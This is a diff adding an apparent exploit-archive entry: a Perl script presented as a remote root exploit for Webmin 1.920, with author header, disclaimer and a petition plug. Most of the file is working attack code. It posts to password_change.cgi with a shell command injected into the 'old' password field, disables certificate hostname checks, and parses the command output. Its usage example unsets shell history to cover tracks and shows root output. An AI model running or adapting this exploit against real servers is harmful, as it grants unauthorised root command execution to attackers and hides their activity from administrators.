@@ -1,0 +1,96 @@
+id: 33142
+date: 08/21/2019
+title: Webmin 1.920 Remote Root Exploit
+author: Todor Donev
+cves: 
+
+#!/usr/bin/perl -w
+#
+#  Webmin 1.920 Remote Root Exploit
+#
+#  Copyright 2019 (c) Todor Donev <todor.donev at gmail.com>
+#
+#  Disclaimer:
+#  This or previous programs are for Educational 
+#  purpose ONLY. Do not use it without permission. 
+#  The usual disclaimer applies, especially the 
+#  fact that Todor Donev is not liable for any 
+#  damages caused by direct or indirect use of the 
+#  information or functionality provided by these 
+#  programs. The author or any Internet provider 
+#  bears NO responsibility for content or misuse 
+#  of these programs or any derivatives thereof.
+#  By using these programs you accept the fact 
+#  that any damage (dataloss, system crash, 
+#  system compromise, etc.) caused by the use 
+#  of these programs are not Todor Donev's 
+#  responsibility.
+#   
+#  Use them at your own risk!
+#
+#  The other exploits not works for me..
+#
+#  Tested on CentOS
+#
+#  [test@localhost ~]$ perl webmin.pl
+#  [ Webmin 1.920 Remote Root Exploit
+#  [ ==========================================================
+#  [ First time released at Defcon
+#  [ Thank you guys, for all..
+#  [ Exploit by: Todor Donev
+#  [ <todor.donev@gmail.com>
+#  [ ==========================================================
+#  [ Usage: webmin.pl <host> <port> <command>
+#  [ e.g. webmin.pl localhost 10000 "unset HISTFILE;uname -a;id;uptime"
+#
+#  uid=0(root) gid=0(root) groups=0(root) context=system_u:system_r:initrc_t:s0
+#  [test@localhost ~]$ 
+#
+#
+#
+#    ATTENTION !! ATTENTION !! ATTENTION !! ATTENTION !! ATTENTION !! 
+#
+#  Guys, please give a star to https://github.com/otvorete/petition
+#  to support the cause of the Bulgarian Hackers (Developers) Community.
+#  We want to makes our Electronic Government more securе, transparent 
+#  and reliable. For this reason we want from our government to open 
+#  the source codes of the applications. So support us with a star, 
+#  please..
+#
+#  Special thanks to Konstantin Spirov that starting the cause!!
+#
+#
+
+use strict;
+use HTTP::Request;
+use LWP::UserAgent;
+
+my $host = shift || 'localhost';
+my $port = shift || '10000';
+my $cmd = shift || 'uname -a;id;uptime';
+$cmd =~ s/\|/\;/g;
+
+print "[ Webmin 1.920 Remote Root Exploit\n";
+print "[ ==========================================================\n";
+print "[ First time released at Defcon\n";
+print "[ Thank you guys, for all..\n";
+print "[ Exploit by: Todor Donev\n";
+print "[ <todor.donev\@gmail.com>\n";
+print "[ ==========================================================\n";
+print "[ Usage: $0 <host> <port> <command>\n";
+print "[ e.g. $0 localhost 10000 \"unset HISTFILE;uname -a;id;uptime\"\n";
+my $browser  = LWP::UserAgent ->new(ssl_opts => { verify_hostname => 0 });
+   $browser->timeout(5);
+   $browser->agent('Mozilla/5.0');
+my $target = "https://".$host.":".$port."/password_change.cgi";
+my $request = HTTP::Request->new (
+                    POST => $target,
+                    [ Content_Type => "application/x-www-form-urlencoded" ,
+                      Referer => "https://".$host.":".$port."/session_login.cgi" ],
+                    "user=wheel&pam=&expired=2&old=id|echo OWNED;$cmd;echo OWNED&new1=wheel&new2=wheel");
+$request->header("Cookie" => "redirect=1; testing=1; sid=x; sessiontest=1;");
+my $content = $browser->request($request)->as_string();
+print $1 and exit if ($content =~ m/OWNED(.*?)OWNED/ms);
+print "[ Exploit Failed!\n" and exit if (not $content =~ m/OWNED(.*?)OWNED/ms);
+
+#  0day.today [2023-03-25]  #
